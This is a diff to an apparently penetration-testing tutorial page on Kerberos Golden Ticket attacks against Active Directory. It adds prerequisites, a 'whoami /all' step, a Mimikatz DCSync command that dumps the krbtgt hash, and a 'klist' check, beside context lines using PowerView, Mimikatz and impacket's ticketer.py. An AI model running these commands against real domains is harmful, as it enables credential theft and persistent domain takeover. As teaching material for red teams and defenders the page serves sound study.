@@ -9,6 +9,8 @@ This tenchnique is particularly advantageos because it enables access to any ser
 
 * **Domain SID**
 * **NTLM hash** of **krbtgt account**
+* **Domain name**
+* **SIDS** (in Cross-Forest Attacks)
 
 #### Methodology:
 
@@ -27,6 +29,12 @@ powershell -ep bypass
 . .\PowerView.ps1
 
 Get-DomainSID
+```
+{% endcode %}
+
+{% code title="Powershell" %}
+```powershell
+whoami /all
 ```
 {% endcode %}
 
@@ -77,10 +85,12 @@ Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' -Computer $DC_NAM
 
 ### DCsync attack
 
-
-
 To acquire the NTLM hash of the krbtgt account, various methods can be employed. It can be extracted from the Local Security Authority Subsystem (LSASS) process or the NT Directory Services (NTDS.dll) file located on any Domain controller (DC) within the domain.\
 Furthermore, executing a DCsync attack is another strategy to obtain this NTLM hash, which can be performed using tools such as the "lsadump::dcsync" in Mimikatz or the secretsdump.py script by Impacket. It's important to unserscore that to undertake these operations, domain admin pribileges or a similar level of access is typically required.
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"'
+```
 
 
 
@@ -113,6 +123,12 @@ ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -
 {% endcode %}
 
 
+
+Check the klist
+
+```powershell
+klist
+```
 
 ## Use Golden Ticket
 
